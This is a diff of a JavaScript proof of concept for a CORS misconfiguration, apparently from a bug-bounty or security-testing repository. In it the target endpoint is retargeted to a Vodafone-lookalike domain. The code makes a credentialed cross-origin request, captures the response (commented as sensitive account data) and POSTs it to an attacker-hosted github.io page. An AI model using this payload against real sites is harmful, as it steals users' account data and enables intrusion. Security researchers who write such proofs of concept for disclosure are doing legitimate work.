@@ -38,14 +38,14 @@
     function cors(){
         var xhttp = new XMLHttpRequest();
 
-    xhttp.open("POST", "https://backend.blog.nubank.com.br/wp-json/", true);
+    xhttp.open("POST", "https://www.vfo01.vodqfone.om/openid/register", true);
     xhttp.setRequestHeader("Content-type", "application/json"); // Set appropriate headers if needed
     xhttp.send();
         xhttp.onreadystatechange = function(){
             if(this.readyState == 4 && this.status == 200) {
                 var a = this.responseText ; // Sensitive data from user account
                 document.getElementById("demo").innerHTML =a;
-                xhttp.open("POST","https://salamoxso.github.io/evil.com/",true);// Sending that data to Attacker's website
+                xhttp.open("POST","https://salamoxso.github.io/evi.vodafone.om/",true);// Sending that data to Attacker's website
                 console.log(a);
                 xhttp.send("data ="+a);
             }
